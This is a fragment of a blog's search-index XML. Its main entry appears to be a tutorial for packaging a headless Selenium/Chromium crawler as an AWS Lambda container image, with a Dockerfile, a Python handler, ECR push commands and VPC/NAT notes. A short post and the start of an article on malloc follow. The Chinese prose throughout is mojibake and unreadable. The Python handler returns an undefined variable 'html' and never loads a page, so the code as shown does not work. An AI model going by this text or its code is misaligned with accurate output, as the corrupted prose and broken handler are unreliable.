class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x entry.sh</span><br></pre></td></tr></table></figure><p>app&#x2F;app.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir app</span><br><span class="line">cd app</span><br><span class="line">vim app.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line"></span><br><span class="line">    chrome_options = Options()</span><br><span class="line">    </span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--autoplay-policy=user-gesture-required&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-background-networking&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-background-timer-throttling&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-backgrounding-occluded-windows&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-breakpad&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-client-side-phishing-detection&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-component-update&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-default-apps&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-domain-reliability&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-extensions&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-features=AudioServiceOutOfProcess&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-hang-monitor&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-ipc-flooding-protection&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-notifications&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-offer-store-unmasked-wallet-cards&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-popup-blocking&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-print-preview&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-prompt-on-repost&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-renderer-backgrounding&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-speech-api&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-sync&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disk-cache-size=33554432&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--hide-scrollbars&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--ignore-gpu-blacklist&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--ignore-certificate-errors&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--metrics-recording-only&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--mute-audio&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-default-browser-check&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-first-run&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-pings&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-zygote&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--password-store=basic&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--use-gl=swiftshader&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--use-mock-keychain&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--single-process&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--user-data-dir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/user-data&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--data-path=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/data-path&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--homedir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disk-cache-dir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/cache-dir&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">    driver = webdriver.Chrome(</span><br><span class="line">        executable_path=<span class="string">&#x27;/usr/bin/chromedriver&#x27;</span>,</span><br><span class="line">        options=chrome_options)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> driver:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Selenium Driver Initiated&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    response = &#123;</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: json.dumps(html, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define global args</span></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR=<span class="string">&quot;/home/app/&quot;</span></span><br><span class="line"><span class="keyword">ARG</span> RUNTIME_VERSION=<span class="string">&quot;3.9&quot;</span></span><br><span class="line"><span class="keyword">ARG</span> DISTRO_VERSION=<span class="string">&quot;3.12&quot;</span></span><br><span class="line"><span class="comment"># Stage 1</span></span><br><span class="line"><span class="keyword">FROM</span> python:$&#123;RUNTIME_VERSION&#125;-alpine$&#123;DISTRO_VERSION&#125; AS python-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache \</span></span><br><span class="line"><span class="language-bash">    libstdc++</span></span><br><span class="line"><span class="comment"># Stage 2</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine AS build-image</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache \</span></span><br><span class="line"><span class="language-bash">    build-base \</span></span><br><span class="line"><span class="language-bash">    libtool \</span></span><br><span class="line"><span class="language-bash">    autoconf \</span></span><br><span class="line"><span class="language-bash">    automake \</span></span><br><span class="line"><span class="language-bash">    libexecinfo-dev \</span></span><br><span class="line"><span class="language-bash">    make \</span></span><br><span class="line"><span class="language-bash">    cmake \</span></span><br><span class="line"><span class="language-bash">    libcurl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"><span class="keyword">ARG</span> RUNTIME_VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python<span class="variable">$&#123;RUNTIME_VERSION&#125;</span> -m pip install awslambdaric --target <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 3</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine as build-image2</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build-image <span class="variable">$&#123;FUNCTION_DIR&#125;</span> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add gcc python3-dev musl-dev \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add jpeg-dev zlib-dev libjpeg-turbo-dev</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python<span class="variable">$&#123;RUNTIME_VERSION&#125;</span> -m pip install -r requirements.txt --target <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"><span class="comment"># Stage 4</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build-image2 <span class="variable">$&#123;FUNCTION_DIR&#125;</span> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add jpeg-dev zlib-dev libjpeg-turbo-dev \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add chromium chromium-chromedriver</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> https://github.com/aws/aws-lambda-runtime-interface-emulator/releases/latest/download/aws-lambda-rie /usr/bin/aws-lambda-rie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 755 /usr/bin/aws-lambda-rie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app/* <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> entry.sh /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [ <span class="string">&quot;/entry.sh&quot;</span> ]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;app.handler&quot;</span> ]</span></span><br></pre></td></tr></table></figure><p>å»ºæ§‹ Image</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t awsLambdacrawler .</span><br></pre></td></tr></table></figure><p>ä¸€ä½†å»ºæ§‹å®Œæˆå¾Œå¯ä»¥é€éæŒ‡ä»¤æŸ¥çœ‹æ˜¯å¦å»ºæ§‹æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h2 id="æ¸¬è©¦å®¹å™¨"><a href="#æ¸¬è©¦å®¹å™¨" class="headerlink" title="æ¸¬è©¦å®¹å™¨"></a>æ¸¬è©¦å®¹å™¨</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 9000:8080 &lt;IMAGE_ID&gt;</span><br></pre></td></tr></table></figure><p>è¼¸å‡ºçµæœæœƒåƒæ˜¯é€™æ¨£<br><img src="https://i.imgur.com/QlxN5Cu.jpg" alt="Imgur"></p><p>æ­¤æ™‚å¯ä»¥å†é–‹ä¸€å€‹ Terminal ä¾†å» invoke çœ‹çœ‹è«‹æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST &quot;http://localhost:9000/2015-03-31/functions/function/invocations&quot; -d &#x27;&#123;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ciclBUc.jpg" alt="Imgur"></p><p>æ¥è‘—å»å»ºç«‹ <strong>ECR Repository</strong>ï¼ˆåœ¨ Local Macbookï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr create-repository --repository-name cx-lambda --image-scanning-configuration scanOnPush=true</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag awsLambdacrawler:latest &lt;ENTER YOUR CONTAINER REPOSITORY URI&gt;:latest</span><br></pre></td></tr></table></figure><p>æ¥è‘—æˆ‘åœ¨ Local Macbook æŸ¥çœ‹ ECR å¯†ç¢¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr get-login-password </span><br></pre></td></tr></table></figure><p>å°‡å¯†ç¢¼è¤‡è£½èµ·ä¾†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login &lt;YOUR AWS ACCOUNT ID&gt;.dkr.ecr.&lt;YOUR REGION&gt;.amazonaws.com (http://amazonaws.com/)&gt;</span><br></pre></td></tr></table></figure><ul><li>username: AWS</li><li>password:  å‰›å‰›è¤‡è£½çš„å¯†ç¢¼</li></ul><p>å°‡ Image æ¨ä¸Š Repository</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push  &lt;YOUR AWS ACCOUNT ID&gt;.dkr.ecr.&lt;YOUR REGION&gt;.amazonaws.com (http://amazonaws.com/)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å» ECR Console ä¸ŠæŸ¥çœ‹<br><img src="https://i.imgur.com/mBqWiCX.jpg" alt="Imgur"></p><h2 id="å»ºç«‹-Lambda"><a href="#å»ºç«‹-Lambda" class="headerlink" title="å»ºç«‹ Lambda"></a>å»ºç«‹ Lambda</h2><p>å» Lambda Console &gt; Create Function &gt; Container Image</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function Name: ScrappingfromImage</span><br><span class="line">Container image URI: 125657041963.dkr.ecr.us-east-1.amazonaws.com/cx-lambda:latest</span><br></pre></td></tr></table></figure><h3 id="è¨­å®š-Lambda-ç¶²è·¯å­˜å–"><a href="#è¨­å®š-Lambda-ç¶²è·¯å­˜å–" class="headerlink" title="è¨­å®š Lambda  ç¶²è·¯å­˜å–"></a>è¨­å®š Lambda  ç¶²è·¯å­˜å–</h3><p>è‹¥æƒ³è¦ Lambda Function é€£æ¥åˆ°å¤–éƒ¨ç¶²è·¯ï¼Œä¸åŒæ–¼EC2ï¼Œä½ éœ€è¦å°‡ Lambda attach åˆ°ä½ è‡ªå·±çš„ VPCï¼Œä¸¦ä¸”éœ€è¦æŠŠ Lambda æ”¾åˆ° private gatewayï¼Œä¸¦ä¸”è©² Private Gateway å¿…é ˆè¦è¨­å®šè·¯ç”±è¡¨ä¸­çš„é è¨­è·¯ç”±åˆ°ä¸€å€‹ <strong>NAT Gateway</strong>ã€‚<br>å› ç‚º Lambda åœ¨é€£æ¥åˆ°æŸå€‹ VPCæ™‚æœƒå»å»ºç«‹ä¸€å€‹ ENIï¼Œé‚£å€‹ENIé è¨­åªåƒ Priavte IPï¼Œå› æ­¤æœƒéœ€è¦ä¸€å€‹ NAT Gateway ä¾†é€²è¡Œå…¬æœ‰ç§æœ‰IPçš„è½‰æ›ï¼Œä¸¦ä¸”æœƒé€éä¸€å€‹å« V2N çš„åŠŸèƒ½ä¾†å»é€£æ¥åˆ° NAT Gatewayã€‚</p><blockquote><p>æœ‰èˆˆè¶£çš„è©±å¯ä»¥åƒè€ƒé€™å…©ä»½å®˜æ–¹æ–‡ä»¶ï¼Œè£¡é¢å° Lambda çš„è¯ç¶²æ©Ÿåˆ¶æœ‰è©³ç´°ä»‹ç´¹<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/foundation-networking.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/foundation-networking.html</a><br><a href="https://aws.amazon.com/tw/blogs/compute/announcing-improved-vpc-networking-for-aws-lambda-functions/">https://aws.amazon.com/tw/blogs/compute/announcing-improved-vpc-networking-for-aws-lambda-functions/</a></p></blockquote><p>é€™é‚Šç”¨æµç¨‹åœ–å±•ç¤ºçš„è©±æœƒæ˜¯é€™æ¨£:</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  flowchart LR    subgraph Custom VPC        direction LR        c1(Lambda) ---&gt; a2(NATGateway)        subgraph Public Subnet            direction LR            a2(NATGateway)        end        subgraph Private Subnet            direction LR            c1(Lambda)        end    end  </pre></div><p><img src="https://i.imgur.com/7suZcAG.jpg" alt="Imgur"></p><p>private route<br><img src="https://i.imgur.com/DAMgy23.jpg" alt="Imgur"></p><h3 id="è¨­å®š-Lambda-Permission"><a href="#è¨­å®š-Lambda-Permission" class="headerlink" title="è¨­å®š Lambda Permission"></a>è¨­å®š Lambda Permission</h3><p>è¦è¨˜å¾—å¹« Lambda æ·»åŠ  <code>VPCAccessExecutionRole</code> é€™å€‹ Permission</p><p>æ¥è‘—å°±æ˜¯æ¸¬è©¦ code</p><p>ä½†å¯ä»¥å…ˆå» Configuration &gt; General Configuration &gt; Timeout  æŠŠ timeout èª¿é«˜</p><blockquote><p>Timeout: 20 sec</p></blockquote><h2 id="æ¸¬è©¦-Lambda"><a href="#æ¸¬è©¦-Lambda" class="headerlink" title="æ¸¬è©¦ Lambda"></a>æ¸¬è©¦ Lambda</h2><p><img src="https://i.imgur.com/fVsALwS.jpg" alt="Imgur"></p><p>æˆåŠŸ</p>]]></content>
      
      
      <categories>
          
          <category> å¯¦ä½œç´€éŒ„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Amazon </tag>
            
            <tag> Lambda </tag>
            
            <tag> ç¶²é çˆ¬èŸ² </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç« </title>
      <link href="/posts/7a776471.html"/>
      <url>/posts/7a776471.html</url>
      
        <content type="html"><![CDATA[<h1 id="å¾-Hugo-ç§»æ¤åˆ°-Hexo"><a href="#å¾-Hugo-ç§»æ¤åˆ°-Hexo" class="headerlink" title="å¾ Hugo ç§»æ¤åˆ° Hexo"></a>å¾ Hugo ç§»æ¤åˆ° Hexo</h1><p>ä¹‹å‰åœ¨ Hugo é›–ç„¶å°±æŒºæ–¹ä¾¿çš„ï¼Œä½†é€™å€‹ Butterfly ä¸»é¡ŒçœŸçš„å¤ªè´Šäº†ï¼Œå°±å…ˆç§»æ¤éä¾†ç©çœ‹çœ‹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ—ƒï¸Deep Dive: malloc å‡½å¼å¦‚ä½•é€²è¡Œè¨˜æ†¶é«”åˆ†é…</title>
      <link href="/posts/78d9b0c6.html"/>
      <url>/posts/78d9b0c6.html</url>
      
        <content type="html"><![CDATA[<h1 id="Deep-Dive-malloc-å‡½å¼å¦‚ä½•é€²è¡Œè¨˜æ†¶é«”åˆ†é…"><a href="#Deep-Dive-malloc-å‡½å¼å¦‚ä½•é€²è¡Œè¨˜æ†¶é«”åˆ†é…" class="headerlink" title="Deep Dive: malloc å‡½å¼å¦‚ä½•é€²è¡Œè¨˜æ†¶é«”åˆ†é…?"></a>Deep Dive: malloc å‡½å¼å¦‚ä½•é€²è¡Œè¨˜æ†¶é«”åˆ†é…?</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‹•æ…‹è¨˜æ†¶é«”é…ç½®æ˜¯ä¸€å€‹é‡è¦çš„æ¦‚å¿µã€‚å®ƒè®“ç¨‹å¼å¯ä»¥åœ¨åŸ·è¡ŒæœŸé–“æ ¹æ“šéœ€è¦å‹•æ…‹åœ°åˆ†é…å’Œé‡‹æ”¾è¨˜æ†¶é«”ï¼Œè€Œä¸å¿…ä¾è³´æ–¼äº‹å…ˆéœæ…‹åˆ†é…çš„è¨˜æ†¶é«”å€å¡Šã€‚é€™æ¨£çš„å½ˆæ€§ä½¿ç¨‹å¼èƒ½å¤ æ›´æœ‰æ•ˆåœ°åˆ©ç”¨è¨˜æ†¶é«”è³‡æºï¼Œä¸¦è™•ç†å„ç¨®å¤§å°å’Œè¤‡é›œæ€§çš„å•é¡Œã€‚</p><p>Cèªè¨€ä¸­çš„mallocå‡½å¼æ˜¯ä¸€å€‹å»£æ³›ä½¿ç”¨çš„å‹•æ…‹è¨˜æ†¶é«”åˆ†é…å‡½å¼ã€‚å®ƒå…è¨±ç¨‹å¼è¨­è¨ˆå¸«åœ¨åŸ·è¡ŒæœŸé–“å‹•æ…‹åœ°åˆ†é…æŒ‡å®šå¤§å°çš„è¨˜æ†¶é«”å€å¡Šã€‚mallocçš„ä¸€å€‹é‡è¦ç‰¹æ€§æ˜¯å®ƒèƒ½å¤ ç¢ºä¿åˆ†é…çš„è¨˜æ†¶é«”å€å¡Šåœ¨ä½¿ç”¨æœŸé–“æ˜¯æœ‰æ•ˆå’Œå¯å­˜å–çš„ï¼ŒåŒæ™‚é©ç•¶åœ°é‡‹æ”¾å®ƒå€‘ä»¥é¿å…è¨˜æ†¶é«”æ´©æ¼ã€‚</p><p>ç„¶è€Œï¼Œä½ æˆ–è¨±å¥½å¥‡mallocå‡½å¼åœ¨åº•å±¤æ˜¯å¦‚ä½•å¯¦ç¾è¨˜æ†¶é«”åˆ†é…çš„ï¼Œè¦å¦‚ä½•æº–ç¢ºå‹•æ…‹åˆ†é…ç©ºå‡ºçš„è¨˜æ†¶é«”çµ¦caller?ã€‚é€™å°±æ˜¯æˆ‘å€‘å°‡åœ¨æœ¬æ–‡ä¸­æ·±å…¥æ¢è¨çš„ä¸»é¡Œã€‚æˆ‘å€‘å°‡è‘—é‡æ–¼mallocå‡½å¼çš„åº•å±¤å¯¦ç¾ï¼Œç‰¹åˆ¥æ˜¯ç•¶æˆ‘å€‘å‘¼å«mallocæ™‚ï¼Œç³»çµ±å¦‚ä½•æ±ºå®šå’Œåˆ†é…ä¸€å¡Šåˆé©çš„è¨˜æ†¶é«”ä½å€çµ¦æˆ‘å€‘ä½¿ç”¨ã€‚</p><p>åœ¨æ¢è¨é€™å€‹å•é¡Œä¹‹å‰ï¼Œè®“æˆ‘å€‘å…ˆå›é¡§ä¸€ä¸‹å‹•æ…‹è¨˜æ†¶é«”é…ç½®çš„åŸºæœ¬æ¦‚å¿µã€‚åœ¨Cèªè¨€ä¸­ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨mallocå‡½å¼ä¾†å‹•æ…‹åœ°åˆ†é…è¨˜æ†¶é«”ã€‚å®ƒçš„å‡½å¼åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>mallocå‡½å¼æ¥å—ä¸€å€‹æ­£æ•´æ•¸åƒæ•¸sizeï¼Œä»£è¡¨æˆ‘å€‘å¸Œæœ›åˆ†é…çš„è¨˜æ†¶é«”å€å¡Šå¤§å°ï¼ˆä»¥ä½å…ƒçµ„ç‚ºå–®ä½ï¼‰ã€‚å®ƒæœƒå˜—è©¦æ‰¾åˆ°ä¸€å¡Šè¶³å¤ å¤§çš„é€£çºŒè¨˜æ†¶é«”å€å¡Šï¼Œä¸¦å°‡å…¶æ¨™è¨˜ç‚ºå·²åˆ†é…ã€‚å¦‚æœæˆåŠŸæ‰¾åˆ°ä¸€å¡Šåˆé©çš„è¨˜æ†¶é«”å€å¡Šï¼Œmallocå‡½å¼å°‡è¿”å›æŒ‡å‘è©²å€å¡Šé–‹é ­çš„æŒ‡æ¨™ï¼›å¦å‰‡ï¼Œå®ƒå°‡è¿”å›NULLè¡¨ç¤ºåˆ†é…å¤±æ•—ã€‚</p><p>é›–ç„¶mallocå‡½å¼çœ‹èµ·ä¾†ç›¸å°ç°¡å–®ï¼Œä½†å…¶åº•å±¤çš„å¯¦ç¾æ˜¯ä¸€å€‹è¤‡é›œçš„ä»»å‹™ã€‚ä¸åŒçš„ä½œæ¥­ç³»çµ±å’Œç·¨è­¯å™¨å¯èƒ½ä½¿ç”¨ä¸åŒçš„æ¼”ç®—æ³•å’Œç­–ç•¥ä¾†åŸ·è¡Œè¨˜æ†¶é«”åˆ†é…ã€‚å› æ­¤ï¼Œæˆ‘å€‘å°‡æ·±å…¥ç 